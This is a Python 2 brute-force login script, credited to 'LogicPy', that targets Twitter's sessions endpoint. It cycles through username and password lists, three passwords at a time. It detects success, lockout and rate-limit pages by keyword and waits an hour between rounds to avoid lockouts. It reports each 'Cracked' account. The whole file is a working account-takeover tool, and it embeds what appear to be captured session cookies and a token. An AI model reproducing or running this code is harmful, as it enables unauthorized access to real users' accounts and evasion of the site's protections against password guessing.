
# Authenticate Query Unification Application
# Wayne Kenney - 2015                                   
#  _____                 ___     ___ 
# |  _  |___ _ _ ___ ___|_  |   |   |
# |     | . | | | .'|___|_| |_ _| | |
# |__|__|_  |___|__,|   |_____|_|___|
#         |_|                        
# By LogicPy

# Frame.py:

#Modules
import requests
from random import randint
import time
from itertools import islice

def banner():
	print """
	 _____ _               _                     
	|_   _| |_ ___ ___ ___| |_ ___ ___   ___ _ _ 
	  | | |   | .'|   | .'|  _| . |_ -|_| . | | |
	  |_| |_|_|__,|_|_|__,|_| |___|___|_|  _|_  |
	                                    |_| |___|                                                       
	  - patience and discretion
"""

# Global Variables
uname = 'a'
pwd = 'a'
inc = 0
aPlace = 0
bPlace = 3

#Main Routine.
def main():

	#Enable access to variables ANYWHERE
	global USERNAME
	global PASSWORD
	global login_URL
	global page
	global landing
	global keyword
	global keyword2
	global keyword3
	global keyword4
	global keyword5
	global attempts
	import time
	global uname
	global pwd

	#Login URL
	login_URL = 'https://twitter.com/sessions'
	#login_URL redirected to after login_URL containing keyword
	landing = 'https://twitter.com/'
	#The keyword that indicates successful login_URL detection
	keyword = 'Verify your identity'
	# Successful Login
	keyword2 = 'Add emoji'
	# Another Successful Login
	keyword3 = 'Your account has been locked'
	# Login Attempt Overload Indicator
	keyword4 = 'Yikes! We need'
	# Checkpoint - Broken username
	keyword5 = 'We detected unusual'

main()
	
#Used for finding values between tags
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def processReq():
	global inc
	global aPlace
	global bPlace

	# For usernames
	text_file = open("list.txt", "r")

	text_file2 = open("pw.txt", "r")

	with requests.Session() as c:
	
		# Username list 
		USERNAME = text_file.read().split('\n')
		# Password list
		PASSWORD = text_file2.read().split('\n')

		# Infinite cycle
		while(True):

			# Username cycle
			for u in USERNAME:
				# Password cycle (Only first three words)
				for p in PASSWORD[aPlace:bPlace]:
				
					# Print process
					uname = u
					pwd = p

					# 1) Direct to login url. Prepare for POST login
					c.get(login_URL)

					#POST Login data
					login_data = \
					{
						'session[username_or_email]':uname,
						'session[password]':pwd,
						'scribe_log':'',
						'redirect_after_login':'/',
						'authenticity_token':'9ddeb53ea993dbf86b0af9ec2b8cdee5bbe4ece1',
						'remember_me':'1'
					}

					#Header data
					header_data = \
					{
						'authority':'twitter.com',
						'method':'POST',
						'path':'/sessions',
						'scheme':'https',
						'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
						'accept-encoding':'gzip, deflate, br',
						'accept-language':'en-US,en;q=0.9',
						'cache-control':'max-age=0',
						'content-length':'953',
						'content-type':'application/x-www-form-urlencoded',
						'cookie':'syndication_guest_id=v1%3A149513189229263369; moments_profile_moments_nav_tooltip_self=true; __utmz=43838368.1500976289.1.1.utmcsr=dramaalert.com|utmccn=(referral)|utmcmd=referral|utmcct=/; eu_cn=1; tfw_exp=0; kdt=EVzvIIL5j6Q3jRDPCI08zHTEhTMywZYGLbQZWmt7; remember_checked_on=1; _ga=GA1.2.803078726.1494815446; __utma=43838368.803078726.1494815446.1513538522.1513992563.6; dnt=1; personalization_id="v1_7gxCPhntXzC/ULKOMrGc5g=="; guest_id=v1%3A151591773023026534; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCHH0NRZhAToMY3NyZl9p%250AZCIlZjNiYTQ5NjExM2E3YzZiZDU0N2ZhMmQ1NjQyMDVjN2E6B2lkIiVjMWEy%250AZjQzMTM3YmM1MTMxMDQ5MmU5YjczNjA4ZDc2Mg%253D%253D--ce106ff13230a909bbb5dcade84e4790a4ff4fb2; ct0=c39b20d67905131d4437012ce2f2e54f; _gid=GA1.2.1770201502.1516496108; gt=954879940293513216; _gat=1',
						'origin':'https://twitter.com',
						'referer':'https://twitter.com/login/error?username_or_email=fazerug&redirect_after_login=%2F',
						'upgrade-insecure-requests':'1',
						'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'
					}

					# 2) Submit POST data. Initialize login
					processReq.page = c.post(login_URL, data=login_data, headers=header_data)

					# 4) Looking for keyword indicating successful login
					Check = processReq.page.content.find(keyword)
					Check2 = processReq.page.content.find(keyword2)
					Check3 = processReq.page.content.find(keyword3)
					Check4 = processReq.page.content.find(keyword4)
					Check5 = processReq.page.content.find(keyword5)

					if Check == -1 and Check2 == -1 and Check3 == -1: 
						
						if Check5 == -1:
							# Don't do anything
							pass
						else:
							x = raw_input("Broken username detected...")

						if Check4 == -1:
							print "[%s : %s]" % (uname, pwd)

						else:
							x = raw_input("IP rate limit detected...")


					else:
							print '[ '+ uname + ' : ' + pwd + '] - Cracked! '
							x = raw_input("Cracked. Press enter to exit")

			# Inc / Resume
			aPlace = aPlace + 3
			bPlace = bPlace + 3
			print "\nCool down...\n"
			for slptim in range(1,3600):
				time.sleep(1)
				print slptim

banner()
processReq()